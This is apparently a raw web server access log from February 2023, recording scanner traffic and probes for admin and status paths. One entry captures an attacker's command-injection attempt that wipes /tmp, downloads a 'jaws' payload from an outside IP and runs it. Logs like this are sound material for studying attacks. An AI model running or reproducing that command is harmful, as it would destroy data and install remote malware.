193.32.162.159 - - [04/Feb/2023:18:53:23 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
179.43.177.242 - - [04/Feb/2023:19:13:54 +0000] "GET / HTTP/1.0" 200 6625 "-" "Hello World"
193.118.53.210 - - [04/Feb/2023:19:41:54 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
193.32.162.159 - - [04/Feb/2023:19:58:39 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
162.142.125.212 - - [04/Feb/2023:20:56:15 +0000] "GET / HTTP/1.0" 200 6625 "-" "-"
162.142.125.212 - - [04/Feb/2023:20:56:16 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
198.199.117.213 - - [04/Feb/2023:21:13:49 +0000] "GET / HTTP/1.1" 200 6625 "-" "Mozilla/5.0 zgrab/0.x"
50.74.173.2 - - [04/Feb/2023:21:37:11 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.12.253.180/jaws;sh+/tmp/jaws HTTP/1.0" 404 203 "-" "Hello, world"
192.241.230.8 - - [04/Feb/2023:21:48:01 +0000] "GET /hudson HTTP/1.0" 404 204 "-" "Mozilla/5.0 zgrab/0.x"
130.211.54.158 - - [04/Feb/2023:21:49:07 +0000] "GET / HTTP/1.0" 200 6625 "-" "python-requests/2.28.2"
162.243.146.17 - - [04/Feb/2023:21:57:38 +0000] "MGLNDD_217.182.70.109_8090\n" 400 226 "-" "-"
90.151.171.106 - - [04/Feb/2023:22:18:51 +0000] "GET /?Z73541062563Q1 HTTP/1.0" 200 6625 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
193.32.162.159 - - [04/Feb/2023:22:26:16 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
180.149.125.159 - - [04/Feb/2023:22:58:09 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
87.227.250.217 - - [04/Feb/2023:23:33:50 +0000] "GET /status HTTP/1.0" 404 204 "-" "Mozilla"
87.227.250.217 - - [04/Feb/2023:23:33:50 +0000] "GET /stat HTTP/1.0" 404 202 "-" "Mozilla"
134.122.88.17 - - [04/Feb/2023:23:34:46 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
193.32.162.159 - - [05/Feb/2023:00:00:38 +0000] "GET / HTTP/1.0" 200 6625 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
107.170.234.10 - - [05/Feb/2023:00:06:15 +0000] "GET /actuator/health HTTP/1.0" 404 213 "-" "Mozilla/5.0 zgrab/0.x"
192.241.231.9 - - [05/Feb/2023:00:06:23 +0000] "GET /portal/redlion HTTP/1.0" 404 212 "-" "Mozilla/5.0 zgrab/0.x"
64.62.197.49 - - [05/Feb/2023:00:14:11 +0000] "GET / HTTP/1.1" 200 6625 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.37"
64.62.197.56 - - [05/Feb/2023:00:14:31 +0000] "GET /favicon.ico HTTP/1.0" 404 209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0"
